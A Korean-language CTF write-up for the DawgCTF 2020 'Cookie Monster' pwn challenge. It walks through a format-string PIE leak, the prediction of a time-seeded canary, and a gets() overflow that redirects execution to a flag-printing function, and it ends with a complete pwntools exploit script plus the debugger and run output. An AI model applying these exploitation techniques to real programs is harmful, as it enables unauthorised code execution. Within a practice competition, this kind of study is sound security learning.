# [WriteUp]DawgCTF 2020 - Cookie Monster

:black_nib:N1be(sj.dr.nibe@gmail.com)

---

## Overview

### conversation()

```c
__int64 conversation()
{
  unsigned int v0; // eax
  int v1; // eax
  char v3[5]; // [rsp+Fh] [rbp-11h]
  char s[8]; // [rsp+14h] [rbp-Ch]
  unsigned int v5; // [rsp+1Ch] [rbp-4h]

  v0 = time(0LL);
  srand(v0);
  v1 = rand();
  v5 = v1;
  saved_cookie = v1;
  puts("\nOh hello there, what's your name?");
  fgets(s, 8, _bss_start);
  printf("Hello, ");
  printf(s);
  puts("\nWould you like a cookie?");
  gets(v3);
  return check_cookie(v5);
}
```

현재 시간을 시드 값으로 해서 `rand()`를 호출하고, 그렇게 만들어진 4바이트짜리 랜덤 값은 canary와 비슷한 역할을 한다. `gets(v3);`에서 buffer overflow(BOF)가 발생하는데, 이로 인해 canary가 overwrite되면 `check_cookie()`에서 stack smashing detected라는 메시지를 출력하고 프로그램을 종료시킨다. 그러나 현재 시간을 시드로 사용하는 랜덤 값은 파이썬의 `ctypes` 모듈을 이용하면 똑같이 만들어낼 수 있기 때문에 익스플로잇에 별다른 방해가 되지는 않는다.

그러고 나서 이름을 입력받고 인사를 하는데, 이름을 출력할 때 `printf(s);`로 출력해서 format string bug(FSB)가 발생한다. FSB를 이용해서 PIE leak이 가능할 것 같다.

마지막으로 `gets()`에서 BOF를 터뜨려서 return address를 원하는 값으로 덮을 수 있을 것이다.

### flag()

```c
int flag()
{
  char *argv; // [rsp+0h] [rbp-20h]
  const char *v2; // [rsp+8h] [rbp-18h]
  __int64 v3; // [rsp+10h] [rbp-10h]

  argv = "/bin/cat";
  v2 = "flag.txt";
  v3 = 0LL;
  return execve("/bin/cat", &argv, 0LL);
}
```

플래그를 주는 함수이다. 이 함수를 호출하면 된다.

---

## Exploit plan

### Generate canary

우선 파이썬에서 `ctypes` 모듈을 이용하여 canary를 만들고, 실제 canary와 같은 값인지 비교해 보자.

```python
# exploit_cookie_monster.py

from pwn import *
from ctypes import *
from ctypes.util import *

r = process("./cookie_monster")
# r = remote("ctf.umbccd.io", 4200)

libc = CDLL(find_library('c'))
seed = libc.time(0)
libc.srand(seed)
canary = libc.rand()

print(hex(canary))

r.recvuntil("Oh hello there, what's your name?\n")
pause()
r.sendline("Dr.Nibe")

r.interactive()
```

```shell
dr-nibe@ubuntu:~/DawgCTF2020$ python exploit_cookie_monster.py 
[+] Starting local process './cookie_monster': pid 9404
0x6e80912c
[*] Paused (press any to continue)
```

만들어진 canary는 `0x6e80912c`이다. GDB에 attach해서 실제 canary를 확인하자.

```shell
gdb-peda$ x/10gx $rsp
0x7ffd49d35370:	0x0000559ea20cf0d0	0x00007ffd49d35480
0x7ffd49d35380:	0x4e2e724400000000	0x6e80912c00656269
0x7ffd49d35390:	0x00007ffd49d353a0	0x0000559ea20cf34f
0x7ffd49d353a0:	0x0000559ea20cf360	0x00007fd7fab7c1e3
0x7ffd49d353b0:	0x00007fd7fad3c598	0x00007ffd49d35488
gdb-peda$ i r rbp
rbp            0x7ffd49d35390      0x7ffd49d35390
```

canary는 `rbp-0x4`에 위치한다. 파이썬에서 만든 값과 일치하는 것을 확인할 수 있다. 이제 canary를 무시하고 BOF를 터뜨릴 수 있다.

### PIE leak

```shell
gdb-peda$ r
Starting program: /home/dr-nibe/DawgCTF2020/cookie_monster 
               _  _
             _/0\/ \_
    .-.   .-` \_/\0/ '-.
   /:::\ / ,_________,  \
  /\:::/ \  '. (:::/  `'-;
  \ `-'`\ '._ `"'"'\__    \
   `'-.  \   `)-=-=(  `,   |
       \  `-"`      `"-`   /
C is for cookie is for me
Oh hello there, what's your name?
%11$p
Hello, 0x55555555534f
...
Breakpoint 3, 0x0000555555555295 in conversation ()
gdb-peda$ x/10gx $rsp
0x7fffffffdf70:	0x00005555555550d0	0x00007fffffffe080
0x7fffffffdf80:	0x2431312500000000	0x6f0d498355000a70
0x7fffffffdf90:	0x00007fffffffdfa0	0x000055555555534f
0x7fffffffdfa0:	0x0000555555555360	0x00007ffff7deb1e3
0x7fffffffdfb0:	0x00007ffff7fab598	0x00007fffffffe088
```

11번째 format string에서 `conversation()`의 return address가 출력된다. 간단하게 PIE base를 leak할 수 있다.

### Overwrite return address

```shell
gdb-peda$ r
Starting program: /home/dr-nibe/DawgCTF2020/cookie_monster 
               _  _
             _/0\/ \_
    .-.   .-` \_/\0/ '-.
   /:::\ / ,_________,  \
  /\:::/ \  '. (:::/  `'-;
  \ `-'`\ '._ `"'"'\__    \
   `'-.  \   `)-=-=(  `,   |
       \  `-"`      `"-`   /
C is for cookie is for me
Oh hello there, what's your name?
AAAA
Hello, AAAA

Would you like a cookie?
BBBB
...
Breakpoint 1, 0x00005555555552b2 in conversation ()
gdb-peda$ x/10gx $rsp
0x7fffffffdf70:	0x00005555555550d0	0x42007fffffffe080
0x7fffffffdf80:	0x4141414100424242	0x6653b04a5555000a
0x7fffffffdf90:	0x00007fffffffdfa0	0x000055555555534f
0x7fffffffdfa0:	0x0000555555555360	0x00007ffff7deb1e3
0x7fffffffdfb0:	0x00007ffff7fab598	0x00007fffffffe088
```

`gets()`로 입력받은 값은 `0x7fffffffdf7f`부터 저장된다. canary를 포함해서 dummy를 주고, `flag()`의 주소로 return address를 덮으면 된다. `flag()`의 주소는 PIE base + `0x11b5`이다.

---

## Exploit

```python
# exploit_cookie_monster.py

from pwn import *
from ctypes import *
from ctypes.util import *

# r = process("./cookie_monster")
r = remote("ctf.umbccd.io", 4200)

offset_ret = 0x134f # original return address - PIE base
offset_flag = 0x11b5 # address of flag() - PIE base

libc = CDLL(find_library('c'))
seed = libc.time(0)
libc.srand(seed)
canary = libc.rand()

print(hex(canary))

r.recvuntil("Oh hello there, what's your name?\n")
r.sendline("%11$p")
r.recvuntil("Hello, 0x")

pie = int(r.recvline()[:-1], 16) - offset_ret # PIE base
flag = pie + offset_flag # address of flag()
print("address of flag(): " + hex(flag))

payload = "A" * 0xd # dummy
payload += p32(canary)
payload += "A" * 0x8 # dummy
payload += p64(flag)

r.recvuntil("Would you like a cookie?\n")
r.sendline(payload)

r.interactive()
```

```shell
dr-nibe@ubuntu:~/DawgCTF2020$ python exploit_cookie_monster.py 
[+] Opening connection to ctf.umbccd.io on port 4200: Done
0x6fd448ab
address of flag(): 0x55bf31b4a1b5
[*] Switching to interactive mode
DawgCTF{oM_n0m_NOm_I_li3k_c0oOoki3s}
[*] Got EOF while reading in interactive
$  
```

